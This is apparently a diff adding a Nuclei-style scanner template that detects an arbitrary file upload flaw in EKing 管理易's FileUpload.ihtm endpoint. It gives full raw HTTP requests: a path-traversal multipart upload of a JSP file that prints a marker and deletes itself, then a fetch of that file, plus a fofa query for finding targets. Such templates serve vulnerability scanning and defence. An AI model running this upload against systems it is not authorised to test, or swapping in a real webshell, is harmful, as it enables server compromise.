@@ -1,0 +1,40 @@
+id: eking-guanliyi-fileupload_ihtm-file-upload
+
+info:
+  name: EKing 管理易 FileUpload.ihtm 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    fofa: app="EKing-管理易"
+    EKing 管理易 FileUpload.ihtm 接口存在任意文件上传漏洞，攻击者可通过file_name参数和multipart表单上传恶意JSP文件，可能导致服务器被入侵、Webshell植入等安全风险。
+  reference:
+    - 
+  tags: file-upload, eking, guanliyi
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |-
+        POST /app/FileUpload.ihtm?comm_type=EKING&file_name=../../{{username}}.jsp. HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundaryHHaZAYecVOf5sfa6
+
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6
+        Content-Disposition: form-data; name="uplo_file"; filename="rce.jpg"
+
+        <% out.println("pboyjnnrfipmplsukdeczudsefxmywe"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        --WebKitFormBoundaryHHaZAYecVOf5sfa6--
+
+      - |-
+        GET /{{username}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code == 200 && contains_all(body, 'pboyjnnrfipmplsukdeczudsefxmywe')"
